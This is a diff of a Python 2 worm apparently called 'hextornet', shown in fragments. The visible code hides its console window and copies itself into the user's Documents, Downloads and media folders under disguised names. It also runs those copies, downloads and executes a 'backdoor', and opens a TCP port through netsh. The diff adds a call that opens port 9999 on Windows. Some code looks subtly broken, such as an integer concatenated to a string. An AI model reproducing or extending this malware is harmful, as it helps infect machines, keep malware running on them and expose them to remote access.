@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 
-
 from shutil import copyfile
 import os, getpass
 import os, random, sys, pkg_resources
@@ -18,7 +17,6 @@ hextornet   = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
 directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
 hexDir = zip(directories, hextornet)
 localization = []
-
 dst = ""
 
 
@@ -39,6 +37,7 @@ def linux_client(system = sys.platform):
         return True
     else:
         return False
+
 
 def hide():
         window = win32console.GetConsoleWindow()
@@ -83,15 +82,18 @@ def validate():
                 else:
                         print'Not Found [SRC]'
 
+
 def copyHex(hexworm, src, dst):
         copyfile(src, dst)
         print'[PROPAGATE]', dst
         hextornet.remove(hexworm)
 
+
 def duplicate(hexfile):
         filename = open(str(hexfile),'w')
         filename.write(src)
         filename.close()
+
 
 def propagate():
         #print("[===============Worm location==========]")
@@ -119,9 +121,11 @@ def downloadBackDoor(url, path):
         run(os.path.abspath(filename))
         print'\t[DOWNLOAD DONE]', src
 
+
 def runWorms():
         for worm in range(0, len(localization)):
                 run(localization[worm])
+
 
 def run(program):
         print'[RUN HEXTORNET]',program
@@ -130,8 +134,11 @@ def run(program):
                 process.wait()
         except Exception as e:
                 return '[!]'+str(e)
+
+
 def openPort(port):
         os.system('netsh firewall add portopening protocol = TCP port = '+port+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
+
 
 def main():
         if windows_client():
@@ -140,9 +147,11 @@ def main():
                 addStartup()
                 propagate()
                 runWorms()
+		openPort(9999)
         elif linux_client():
 		propagate()
 		validate()
+
 
 if __name__ == "__main__":
         main()
